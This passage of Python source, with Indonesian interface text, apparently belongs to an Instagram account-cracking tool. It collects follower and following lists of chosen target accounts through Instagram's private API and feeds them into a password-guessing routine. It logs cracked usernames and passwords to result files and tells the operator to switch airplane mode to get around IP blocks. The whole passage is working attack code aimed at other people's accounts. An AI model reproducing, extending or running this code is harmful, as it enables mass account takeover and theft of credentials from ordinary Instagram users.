					nama,pengikut,mengikut,postingan=self.eksekusiinfo(user)
					io=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {user_agentAPI()}'
					oi = nel(io, style='yellow')
					print('\n')
					cetak(nel(oi,style='', title='\r[yellow]•[/][white]•[/][yellow]•[/][yellow]CHECKPOINT •[/][white]•[/][yellow]•[/]'))
					os.popen('play-audio data/cp.mp3')
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f"\r┣[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
					self.eksekusikrak(user,pas)

				else:
					continue

			loop+=1
		except:
			self.eksekusikrak(user,pas)



	def menu(self):
		self.logo()
		c=input(f'{OE}[{GN}•{OE}] {LG}Pilih :{GN}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			os.system('clear')
			banner()
			komb=('[yellow][[green]01[yellow]] [green]Crack 1 Target\n[yellow][[green]02[yellow]] [green]Crack Banyak Target')
			sol().print(nel(komb,title='[cyan]Pilih Target Metod'))
			#massal(self)
			mas=input(f'{OE}[{GN}•{OE}] {YW}Pilh : {GN}')
			if mas in ['2','02']:
				pengikutmasal(self)
			elif mas in ['1','01']:
				pengikutaja(self)
			elif mas in ['']:
				print('[red]ISIIN, JANGAN DIKOSONGIN ANYING !!!')

		elif c in ('2','02'):
			os.system('clear')
			banner()
			io = '[red]       Pastikan Target Anda Bersifat Publik'
			oi = nel(io, style='yellow')
			cetak(nel(oi, style='green', title='Crack Mengikuti'))
			#massal(self)
			pr=(f'{OE}[{GN}01{OE}] {GN}Crack 1 Target\n{OE}[{GN}02{OE}] {GN}Crack Banyak Target')
			po=nel(pr,style='green')
			sol().print(po)
			mas=input(f'{OE}[{GN}•{OE}] {YW}Pilh : {GN}')
			if mas in ['2','02']:
				mengikutimasal(self)
			elif mas in ['1','01']:
				mengikutiaja(self)
			elif mas in ['']:
				print('ISIIN, JANGAN DIKOSONGIN ANYING !!!')

		elif c in ('r','R'):
			self.BUG()
		elif c in ('c','C'):
			self.ChangeLog()
		elif c in ('0','00'):
			self.Exit()


def mengikutimasal(self):
			try:
				os.system('clear')
				banner()
				menudump.append('mengikuti')
				komb=(' [yellow]Silahkan Tulis Username Target Anda , Target harus bersifat publik jangan privat ...')
				sol().print(nel(komb,title='[cyan] Crack Target Massal'))
				m=int(input(f'{OE}[{GN}?{OE}] {LG}Masukan jumlah target: '))
			except:m=1
			for t in range(m):
				t +=1
				so=f'# TOTAL ID :{len(internal)}'
				pi=mark(so,style='green')
				sol().print(pi)
				nama=input(f' [{t}] Masukan Username : ')
				pr=f' Sedang Mengumpulkan ID : [green]{nama}[/green]'
				u=nel(pr,style="")
				sol().print(u)
				id=self.idtarget(self.cookie,nama)
				info=self.dumpmengikuti(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.menupassword(info)



def mengikutiaja(self):
	try:
		os.system('clear')
		banner()
		menudump.append('mengikuti')
		komb=(' [yellow]Silahkan Tulis Username Target Anda , Target harus bersifat publik jangan privat ...')
		sol().print(nel(komb,title='[cyan] Crack Target Tunggal'))
		m=input(f'  {YW}[{GN}•{YW}] {BE}Username target : {GN}')
		pr=f' {YW}Sedang Mengumpulkan ID : [green]{m}[/green]'
		so=nel(pr,style="green")
		sol().print(so)
		id=self.idtarget(self.cookie,m)
		info=self.dumpmengikuti(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
		self.menupassword(info)
	except KeyError:
		print(e)


def pengikutmasal(self):
			try:
				os.system('clear')
				banner()
				menudump.append('pengikut')
				komb=(' [yellow]Silahkan Tulis Username Target Anda , Target harus bersifat publik jangan privat ...')
				sol().print(nel(komb,title='[cyan] Crack Target Massal'))
				m=int(input(f'{OE}[{GN}?{OE}] {LG}Masukan jumlah target: '))
			except:m=1
			for t in range(m):
				t +=1
				so=f'# TOTAL ID :{len(internal)}'
				pi=mark(so,style='green')
				sol().print(pi)
				nama=input(f' [{t}] Masukan Username : ')
				pr=f' Sedang Mengumpulkan ID : [green]{nama}[/green]'
				u=nel(pr,style="")
				sol().print(u)
				id=self.idtarget(self.cookie,nama)
				info=self.dumpikuti(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.menupassword(info)



def pengikutaja(self):
			os.system('clear')
			banner()
			menudump.append('pengikut')
			komb=(' [yellow]Silahkan Tulis Username Target Anda , Target harus bersifat publik jangan privat ...')
			sol().print(nel(komb,title='[cyan] Crack Target Tunggal'))
			m=input(f'  {YW}[{GN}•{YW}] {BE}Username target : {GN}')
			pr=f' {YW}Sedang Mengumpulkan ID : [green]{m}[/green]'
			so=nel(pr,style="green")
			sol().print(so)
			id=self.idtarget(self.cookie,m)
			info=self.dumpikuti(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.menupassword(info)

		

if __name__=='__main__':
	try:
		LOGCOKI()
	except requests.exceptions.ConnectionError:
		exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
